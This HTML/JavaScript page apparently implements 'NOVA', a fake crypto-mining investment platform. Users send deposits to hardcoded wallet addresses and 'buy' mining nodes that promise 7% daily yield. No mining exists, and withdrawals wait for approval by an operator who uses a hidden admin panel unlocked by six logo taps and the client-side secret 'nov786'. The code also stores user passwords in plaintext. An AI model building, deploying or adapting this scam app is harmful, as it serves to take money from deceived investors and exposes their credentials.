<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Institutional Mining Protocol</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@400;900&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --bg: #030303; }
        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        .prime-font { font-family: 'Syncopate', sans-serif; }
        .glass { background: rgba(15, 15, 15, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.05); border-radius: 28px; }
        .btn-gold { background: var(--gold); color: black; font-weight: 900; border-radius: 14px; transition: 0.3s; text-transform: uppercase; font-size: 10px; }
        .btn-gold:active { transform: scale(0.95); }
        .nova-input { background: #0a0a0a; border: 1px solid #1a1a1a; width: 100%; padding: 18px; border-radius: 18px; color: white; font-size: 13px; outline: none; margin-bottom: 12px; }
        .screen { display: none; padding-bottom: 120px; animation: fadeIn 0.4s ease; }
        .active-screen { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.95); border-top: 1px solid #111; display: flex; justify-content: space-around; padding: 20px; z-index: 1000; }
        .modal { display: none; position: fixed; inset: 0; background: black; z-index: 2000; padding: 25px; overflow-y: auto; }
    </style>
</head>
<body>

    <div id="auth-screen" class="min-h-screen flex flex-col p-8 justify-center active-screen">
        <h1 onclick="handleTaps()" class="prime-font text-5xl font-black mb-2 text-white">NOVA</h1>
        <p class="text-[9px] text-gray-600 font-black tracking-[5px] uppercase mb-12">Global Assets Terminal</p>
        <div class="space-y-4">
            <input type="text" id="u-email" placeholder="Terminal ID" class="nova-input">
            <input type="password" id="u-pass" placeholder="Passkey" class="nova-input">
            <input type="text" id="adm-key" placeholder="Admin Secret" class="hidden nova-input border-[#D4AF37]">
            <button onclick="auth()" class="w-full btn-gold py-5">Initialize</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-[10px] mt-8 text-gray-500 font-black uppercase cursor-pointer">Register Account</p>
        </div>
    </div>

    <div id="app" class="hidden">
        <div id="dash-screen" class="screen active-screen p-6">
            <div class="flex justify-between items-center mb-8">
                <h2 class="prime-font text-sm">TERMINAL v.4</h2>
                <div class="w-10 h-10 glass flex items-center justify-center text-xs text-[#D4AF37] font-black">N</div>
            </div>

            <div class="glass p-10 mb-8 border-b-2 border-[#D4AF37]/40 text-center">
                <p class="text-[9px] text-gray-500 font-black uppercase mb-3">Liquidity Value</p>
                <h1 id="main-bal" class="text-5xl font-black tracking-tighter">$0.00</h1>
                <p id="v-daily" class="text-green-500 text-[10px] font-black mt-4 uppercase tracking-widest">Yield: +$0.00</p>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="openModal('dep-modal')" class="glass p-5 text-xs font-black text-green-500 uppercase">Deposit</button>
                <button onclick="openModal('wd-modal')" class="glass p-5 text-xs font-black text-red-500 uppercase">Withdraw</button>
            </div>

            <div class="glass p-6">
                <h3 class="text-[10px] font-black uppercase text-gray-500 mb-4 tracking-widest">Protocol Stats</h3>
                <div class="flex justify-between border-b border-white/5 pb-3 mb-3">
                    <span class="text-[10px] font-bold text-gray-400">Network Status</span>
                    <span class="text-[10px] font-black text-green-500">SECURE</span>
                </div>
                <div class="flex justify-between">
                    <span class="text-[10px] font-bold text-gray-400">Node ID</span>
                    <span id="user-display" class="text-[10px] font-black text-white uppercase">---</span>
                </div>
            </div>
        </div>

        <div id="mine-screen" class="screen p-6">
            <h2 class="prime-font text-2xl mb-8">HARDWARE</h2>
            <div id="nodes-container" class="space-y-6"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item text-white" id="nav-dash"><i class="fa-solid fa-house"></i></div>
            <div onclick="nav('mine-screen')" class="nav-item text-gray-600" id="nav-mine"><i class="fa-solid fa-server"></i></div>
        </nav>
    </div>

    <div id="dep-modal" class="modal">
        <div onclick="closeModal('dep-modal')" class="mb-8 text-gray-500 font-bold text-xs uppercase">Close</div>
        <h2 class="text-3xl font-black mb-8 gold-text">DEPOSIT</h2>
        <select id="dep-method" class="nova-input" onchange="updateDepAddr()">
            <option value="Trust">Trust Wallet (BEP20)</option>
            <option value="Meta">MetaMask (ERC20)</option>
            <option value="Binance">Binance (TRC20)</option>
        </select>
        <div class="glass p-5 mb-8 text-center border-dashed border-gray-700">
            <p id="dep-addr" class="text-[10px] font-mono break-all text-gray-400">0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37</p>
        </div>
        <input type="number" id="dep-amt" placeholder="Amount ($)" class="nova-input">
        <input type="text" id="dep-user" placeholder="Account Name" class="nova-input">
        <input type="text" id="dep-tid" placeholder="TID Number" class="nova-input">
        <p class="text-[9px] text-gray-600 uppercase font-black mb-2">Upload Proof</p>
        <input type="file" id="dep-proof" accept="image/*" class="mb-8 text-[10px] text-gray-500">
        <button onclick="requestFin('Deposit')" class="w-full btn-gold py-5">Submit Request</button>
    </div>

    <div id="wd-modal" class="modal">
        <div onclick="closeModal('wd-modal')" class="mb-8 text-gray-500 font-bold text-xs uppercase">Close</div>
        <h2 class="text-3xl font-black mb-8 text-red-500">WITHDRAW</h2>
        <select id="wd-method" class="nova-input">
            <option value="JazzCash">JazzCash</option>
            <option value="EasyPaisa">EasyPaisa</option>
            <option value="Trust Wallet">Trust Wallet</option>
            <option value="Binance Pay">Binance Pay</option>
            <option value="MetaMask">MetaMask</option>
            <option value="OKX">OKX</option>
            <option value="Coinbase">Coinbase</option>
        </select>
        <input type="number" id="wd-amt" placeholder="Amount ($)" class="nova-input">
        <input type="text" id="wd-user" placeholder="Account Title" class="nova-input">
        <input type="text" id="wd-acc" placeholder="Account Number" class="nova-input">
        <button onclick="requestFin('Withdrawal')" class="w-full bg-white text-black font-black py-5 rounded-2xl uppercase text-[10px]">Confirm Extract</button>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-black z-[9999] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="text-[#D4AF37] font-black uppercase">ADMIN</h2><button onclick="location.reload()" class="text-red-500 font-black">EXIT</button></div>
        <div id="adm-list" class="space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);
        let activeUser = null; let isLogin = true;

        const addrs = { "Trust": "0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37", "Meta": "0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2", "Binance": "0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37" };
        window.updateDepAddr = () => { document.getElementById('dep-addr').innerText = addrs[document.getElementById('dep-method').value]; };

        window.auth = async () => {
            const id = document.getElementById('u-email').value.toLowerCase().trim();
            const pw = document.getElementById('u-pass').value;
            const ak = document.getElementById('adm-key').value;
            if(ak === "nov786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); return; }
            if(!id || !pw) return;
            const uRef = doc(db, "users", id); const s = await getDoc(uRef);
            if(!isLogin) {
                await setDoc(uRef, { balance: 0, password: pw, daily: 0 });
                start(id);
            } else if(s.exists() && s.data().password === pw) {
                start(id);
            } else alert("Error");
        };

        function start(id) {
            activeUser = id; document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            document.getElementById('user-display').innerText = id;
            onSnapshot(doc(db, "users", id), d => {
                document.getElementById('main-bal').innerText = "$" + (d.data().balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "Yield: +$" + (d.data().daily || 0).toFixed(2);
            });
            renderNodes();
        }

        window.requestFin = async (type) => {
            const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
            let payload = { user: activeUser, type, status: 'Pending', time: Date.now() };
            if(type === 'Deposit') {
                payload.amount = parseFloat(document.getElementById('dep-amt').value);
                payload.method = document.getElementById('dep-method').value;
                payload.username = document.getElementById('dep-user').value;
                payload.tid = document.getElementById('dep-tid').value;
                const file = document.getElementById('dep-proof').files[0];
                if(file) {
                    const reader = new FileReader();
                    reader.onloadend = async () => { payload.proof = reader.result; await addDoc(collection(db, "logs"), payload); alert("Done!"); closeModal('dep-modal'); };
                    reader.readAsDataURL(file);
                } else { await addDoc(collection(db, "logs"), payload); alert("Done!"); closeModal('dep-modal'); }
            } else {
                payload.amount = parseFloat(document.getElementById('wd-amt').value);
                payload.method = document.getElementById('wd-method').value;
                payload.acc = document.getElementById('wd-acc').value;
                if(s.data().balance < payload.amount) return alert("Low Bal");
                await updateDoc(uRef, { balance: s.data().balance - payload.amount });
                await addDoc(collection(db, "logs"), payload); alert("Sent!"); closeModal('wd-modal');
            }
        };

        function renderNodes() {
            const container = document.getElementById('nodes-container'); container.innerHTML = "";
            for(let i=1; i<=20; i++) {
                let p = i===1?15:(i*80); let y = (p*0.07).toFixed(2);
                container.innerHTML += `<div class="glass p-6 flex justify-between items-center">
                    <div><p class="text-[9px] font-black text-gray-500 uppercase">NODE ALPHA ${i}</p><p class="text-xl font-black">$${p}</p></div>
                    <button onclick="buyNode(${p},${y})" class="btn-gold px-6 py-3">Deploy</button>
                </div>`;
            }
        }

        window.buyNode = async (p, d) => {
            const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
            if(s.data().balance < p) return alert("Low Balance");
            await updateDoc(uRef, { balance: s.data().balance - p, daily: (s.data().daily || 0) + parseFloat(d) });
            alert("Mining Started!");
        };

        function loadAdmin() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const al = document.getElementById('adm-list'); al.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    al.innerHTML += `<div class="glass p-5 border-l-4 ${r.type=='Deposit'?'border-green-500':'border-red-500'}">
                        <p class="text-[10px] font-black uppercase mb-1">${r.type} | ${r.user}</p>
                        <p class="text-xl font-black mb-3">$${r.amount}</p>
                        <div class="text-[8px] text-gray-500 mb-4 uppercase"><p>Method: ${r.method}</p><p>TID/ACC: ${r.tid || r.acc}</p></div>
                        <div class="flex gap-2">
                            <button onclick="approve('${d.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-green-600 py-2 rounded-lg text-[9px] font-black">APPROVE</button>
                            <button onclick="reject('${d.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-red-600 py-2 rounded-lg text-[9px] font-black">REJECT</button>
                        </div>
                    </div>`;
                });
            });
        }

        window.approve = async (id, u, a, t) => { if(t === 'Deposit') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); } await updateDoc(doc(db, "logs", id), { status: 'Success' }); };
        window.reject = async (id, u, a, t) => { if(t === 'Withdrawal') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); } await updateDoc(doc(db, "logs", id), { status: 'Rejected' }); };
        window.handleTaps = () => { window.taps = (window.taps || 0) + 1; if(window.taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.toggleM = () => { isLogin = !isLogin; document.getElementById('m-text').innerText = isLogin ? "Register Account" : "Back to Login"; };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.style.color = '#333');
            document.getElementById('nav-' + id.split('-')[0]).style.color = 'white';
        };
    </script>
</body>
</html>
